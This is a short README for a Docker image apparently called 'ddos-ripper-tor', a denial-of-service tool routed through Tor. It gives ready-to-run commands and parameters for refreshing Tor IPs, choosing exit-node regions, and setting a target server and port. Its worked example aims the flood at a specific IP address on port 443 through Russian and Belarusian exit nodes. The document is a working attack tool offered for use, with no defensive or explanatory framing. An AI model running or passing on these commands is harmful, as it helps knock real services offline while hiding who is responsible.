# Requirements

## Install Docker

- [Windows](https://docs.docker.com/desktop/windows/install)
- [Linux](https://docs.docker.com/engine/install/ubuntu/)
- [Mac](https://docs.docker.com/desktop/mac/install)

# Usage

Basic usage

```
docker run --rm -it zengraf/ddos-ripper-tor -s [IP address]
```

## Parameters

- `-r <refresh>` - Tor IP refresh in seconds
- `-e <regions>` - Tor exit node regions separated by comma
- `-s <server>` - server IP address
- `-p <port>` - server port
- `-t <turbo>` - turbo

## Example

```bash
docker run --rm -it zengraf/ddos-ripper-tor -e ru,by -s 194.54.14.139 -p 443
```
